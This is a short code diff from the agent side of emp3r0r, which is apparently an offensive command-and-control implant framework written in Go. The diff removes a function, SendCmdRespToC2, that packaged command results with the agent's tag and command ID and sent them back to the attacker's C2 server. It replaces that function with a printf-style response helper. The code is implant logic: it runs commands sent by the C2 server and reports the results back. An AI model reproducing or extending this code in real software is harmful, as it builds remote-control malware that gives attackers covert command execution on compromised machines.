@@ -27,25 +27,8 @@ func handleC2Command(cmdData *emp3r0r_def.MsgTunData) {
 	command.SetOutput(log.Writer())
 	err := command.Execute()
 	if err != nil {
-		SendCmdRespToC2(err.Error(), command, cmdSlice)
+		C2RespPrintf(command, "Error: %v", err)
 	}
-}
-
-// send response to C2 server
-func SendCmdRespToC2(resp string, cmd *cobra.Command, args []string) {
-	data2send := emp3r0r_def.MsgTunData{
-		Tag: RuntimeConfig.AgentTag,
-	}
-	cmd_id, _ := cmd.Flags().GetString("cmd_id")
-	cmdSlice := []string{cmd.Name()}
-	cmdSlice = append(cmdSlice, args...)
-	data2send.CmdID = cmd_id
-	data2send.CmdSlice = cmdSlice
-	data2send.Response = resp
-	if err := Send2CC(&data2send); err != nil {
-		log.Println(err)
-	}
-	log.Printf("Response sent: %s", resp)
 }
 
 func C2RespPrintf(cmd *cobra.Command, format string, args ...interface{}) {
